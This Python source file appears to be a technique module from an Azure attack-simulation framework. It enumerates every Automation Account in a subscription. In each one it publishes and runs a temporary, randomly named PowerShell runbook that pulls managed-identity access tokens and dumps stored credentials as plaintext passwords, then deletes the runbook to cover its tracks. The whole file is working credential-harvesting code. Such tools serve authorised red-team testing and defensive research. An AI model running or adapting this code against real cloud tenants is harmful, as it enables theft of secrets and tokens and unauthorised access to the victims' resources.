from azure.identity import DefaultAzureCredential
from azure.mgmt.automation import AutomationClient
from azure.mgmt.resource import ResourceManagementClient

import random
import string
import time
import json

def TechniqueMain(subscription_id):
    '''Function to get credentials and tokens from Automation Accounts'''
    
    # input validation
    if subscription_id in ["", None]:
        return False, {"Error" : "Invalid input : Subscription ID required"}, None
    
    def create_and_run_runbook_direct(resource_group_name, auto_account_name, runbook_content, automation_client):
        '''Create, run, and delete a runbook directly in an Automation Account'''
        try:
            runbook_name = ''.join(random.choices(string.ascii_letters, k=15))
            print(f"                Importing and running runbook {runbook_name}")

            # Create and import the runbook
            automation_client.runbook.create_or_update(
                resource_group_name=resource_group_name,
                automation_account_name=auto_account_name,
                runbook_name=runbook_name,
                parameters={
                    "location": "eastus",
                    "log_verbose": True,
                    "runbook_type": "PowerShell",
                    "description": "Runbook to get plaintext credentials",
                    "log_progress": True,
                    "draft": {"content": runbook_content}
                }
            )

            # Update the runbook content
            automation_client.runbook_draft.begin_replace_content(
                resource_group_name=resource_group_name,
                automation_account_name=auto_account_name,
                runbook_name=runbook_name,
                runbook_content=runbook_content
            )

            # Publish the runbook
            automation_client.runbook.begin_publish(
                resource_group_name=resource_group_name,
                automation_account_name=auto_account_name,
                runbook_name=runbook_name
            ).result()

            # Start the job
            job_parameters = {
                "properties": {
                    "runbook": {"name": runbook_name},
                    "parameters": {},
                    "runOn": ""
                }
            }

            job = automation_client.job.create(
                resource_group_name=resource_group_name,
                automation_account_name=auto_account_name,
                parameters=job_parameters,
                job_name=runbook_name
            )

            # Monitor job status
            while True:
                job_status = automation_client.job.get(
                    resource_group_name=resource_group_name,
                    automation_account_name=auto_account_name,
                    job_name=runbook_name
                ).status
                
                if job_status in ["Completed", "Failed", "Suspended", "Stopped"]:
                    break

                time.sleep(10)
                
            # Retrieve job output
            job_output = automation_client.job_stream.list_by_job(
                resource_group_name=resource_group_name,
                automation_account_name=auto_account_name,
                job_name=runbook_name
            )

            value = []
            for stream in job_output:
                if stream.stream_type == 'Output':
                    value.append(stream.summary)

            return value if value else None

        except Exception as e:
            return False, {"Error" : e}, None
        
        finally:
            # Cleanup runbook
            try:
                print(f"                Removing runbook: {runbook_name}")
                automation_client.runbook.delete(
                    resource_group_name=resource_group_name,
                    automation_account_name=auto_account_name,
                    runbook_name=runbook_name
                )
            except Exception as e:
                return False, {"Error" : e}, None

    def process_identities(resource_group_name, auto_account_name, user_assigned_clients, system_assigned_principal_id, automation_client):
        '''Retrieve tokens for identities (user and system assigned) in an Automation Account'''
        script_lines = [
            "$resource = '?resource=https://management.azure.com/'",
            "$Headers = New-Object 'System.Collections.Generic.Dictionary[[String],[String]]'",
            "$Headers.Add('X-IDENTITY-HEADER', $env:IDENTITY_HEADER)",
            "$Headers.Add('Metadata', 'True')",
            "$result = @()"
        ]

        # Add script for system assigned identity
        if system_assigned_principal_id:
            script_lines += [
                "$url_system = $env:IDENTITY_ENDPOINT + $resource",
                "$accessToken_system = Invoke-RestMethod -Uri $url_system -Method 'GET' -Headers $Headers",
                "$token_system = $accessToken_system.access_token",
                f"$result += [pscustomobject]@{{PrincipalId = '{system_assigned_principal_id}'; Token = $token_system}}"
            ]

        # Add script for user assigned identities
        if user_assigned_clients:
            for user_assigned_client in user_assigned_clients:
                principal_id = user_assigned_client['PrincipalId']
                client_id = user_assigned_client['ClientId']
                script_lines += [
                    f"$identityClientId = '{client_id}'",
                    "$url_user = $env:IDENTITY_ENDPOINT + $resource + '&client_id=' + $identityClientId",
                    "$accessToken_user = Invoke-RestMethod -Uri $url_user -Method 'GET' -Headers $Headers",
                    "$token_user = $accessToken_user.access_token",
                    f"$result += [pscustomobject]@{{PrincipalId = '{principal_id}'; Token = $token_user}}"
                ]

        script_lines += ["$result | ConvertTo-Json -Compress | write-output"]

        # Create and run the runbook
        runbook_content = "\n".join(script_lines)
        value_identities= create_and_run_runbook_direct(resource_group_name, auto_account_name, runbook_content, automation_client)
        return value_identities
    
    def process_credentials(resource_group_name, auto_account_name, cred_names, automation_client):
        '''Retrieve credentials stored in an Automation Account'''
        script_lines = [
            "$cred_names = @(" + ", ".join([f"'{cred_name}'" for cred_name in cred_names]) + ")",
            "$result = @()",
            "foreach ($cred_name in $cred_names) {",
            "    $myCredential = Get-AutomationPSCredential -Name $cred_name",
            "    $password = $myCredential.GetNetworkCredential().Password",
            "    $result += [pscustomobject]@{credential_name = $cred_name; password = $password}",
            "}",
            "$result | ConvertTo-Json -Compress | write-output"
        ]

        # Create and run the runbook
        runbook_content = "\n".join(script_lines)
        value_creds = create_and_run_runbook_direct(resource_group_name, auto_account_name, runbook_content, automation_client)
        return value_creds

    # Authenticate and initialize clients
    credential = DefaultAzureCredential()
    automation_client = AutomationClient(credential, subscription_id)
    resource_management_client = ResourceManagementClient(credential, subscription_id)

    resource_groups = resource_management_client.resource_groups.list()

    auto_account_data = {}
    raw_responses = {}

    for resource_group in resource_groups:
        resource_group_name = resource_group.name
        print(f"Processing resource group: {resource_group_name}")
        
        print(f"    Getting Azure Automation Accounts")
        auto_accounts = automation_client.automation_account.list_by_resource_group(resource_group_name)
        accounts_list = [account for account in auto_accounts]

        if not accounts_list:
            print(f"    No automation accounts found in resource group '{resource_group_name}'.")
            continue

        for auto_account in accounts_list:
            auto_account_name = auto_account.name
            print(f"        Processing automation account {auto_account_name}")

            automation_account_info = automation_client.automation_account.get(resource_group_name, auto_account_name)

            # Initialize data for this automation account
            auto_account_data[auto_account_name] = {
                "credentials": [],
                "tokens": {"UserAssigned": [], "SystemAssigned": []}
            }

            # Check for managed identities
            identity_info = automation_account_info.additional_properties.get('identity', {})
            identity_types = identity_info.get('type', '').split(', ')
            user_assigned_clients = []
            system_assigned_principal_id = None

            for identity_type in identity_types:
                if identity_type == 'UserAssigned':
                    user_assigned_clients = [{'PrincipalId': v['PrincipalId'], 'ClientId': v['ClientId']} for v in identity_info.get('userAssignedIdentities', {}).values()]
                if identity_type == 'SystemAssigned':
                    system_assigned_principal_id = identity_info.get('principalId')

            # Process identities
            if user_assigned_clients or system_assigned_principal_id:
                print("            Processing identities")
                token_value = process_identities(resource_group_name, auto_account_name, user_assigned_clients, system_assigned_principal_id, automation_client)
                if token_value:
                    try:
                        raw_responses[f"{auto_account_name}_tokens"] = token_value
                        token_json = json.loads(token_value[0])
                        if isinstance(token_json, list):
                            for token in token_json:
                                auto_account_data[auto_account_name]["tokens"]["UserAssigned" if token["PrincipalId"] != system_assigned_principal_id else "SystemAssigned"].append({
                                    "object_id": token["PrincipalId"],
                                    "token_value": f"{token["Token"]}"
                                })
                        elif isinstance(token_json, dict):
                            auto_account_data[auto_account_name]["tokens"]["UserAssigned" if token_json["PrincipalId"] != system_assigned_principal_id else "SystemAssigned"].append({
                                "object_id": token_json["PrincipalId"],
                                "token_value": f"{token_json["Token"]}"
                            })
                        else:
                            print(f"Unexpected JSON format: {token_json}")
                    except Exception as e:
                        pass

            # Process credentials
            print(f"            Getting credentials for {auto_account_name}")
            auto_creds = automation_client.credential.list_by_automation_account(resource_group_name, auto_account_name)
            creds_list = [cred.name for cred in auto_creds]

            if creds_list:
                print("             Credentials found")
                cred_values = process_credentials(resource_group_name, auto_account_name, creds_list, automation_client)
                try:
                    raw_responses[f"{auto_account_name}_creds"] = cred_values
                    cred_values_json = json.loads(cred_values[0])
                    if isinstance(cred_values_json, list):
                        for cred in cred_values_json:
                            auto_account_data[auto_account_name]["credentials"].append({
                                "credential_name": cred["credential_name"],
                                "credential_value": cred["password"]
                            })
                    elif isinstance(cred_values_json, dict):
                        auto_account_data[auto_account_name]["credentials"].append({
                            "credential_name": cred_values_json["credential_name"],
                            "credential_value": cred_values_json["password"]
                        })
                    else:
                        print(f"Unexpected JSON format: {cred_values_json}")
                except Exception:
                    pass
        
    pretty_response = {}                
    pretty_response["Success"] = auto_account_data
    
    return True, raw_responses, pretty_response

# Function to define the input fields required for the technique execution
def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''
    return [
        {"title" : "Subscription ID", "id" : "subscription-id-text-input", "type" : "text", "placeholder" : "1234-5678-9098-7654-3210", "element_type" : "dcc.Input"},
    ]